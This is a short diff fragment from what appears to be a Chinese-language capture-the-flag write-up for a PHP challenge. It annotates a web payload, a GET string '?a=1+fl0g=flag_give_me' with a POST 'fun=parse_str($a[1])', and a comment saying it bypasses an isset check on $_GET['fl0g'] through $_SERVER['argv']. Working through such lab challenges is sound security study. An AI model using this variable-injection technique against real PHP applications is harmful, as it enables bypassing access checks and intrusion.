@@ -219,7 +219,7 @@ if(!isset($_GET['fl0g'])){
 
 
 Payload：
-GET：?a=1+fl0g=flag_give_me
+GET：?a=1+fl0g=flag_give_me  绕过if(!isset($_GET['fl0g']))
 POST：fun=parse_str($a[1])
 
 由$_SERVER['argV'][1]为 fl0g=flag_give_me
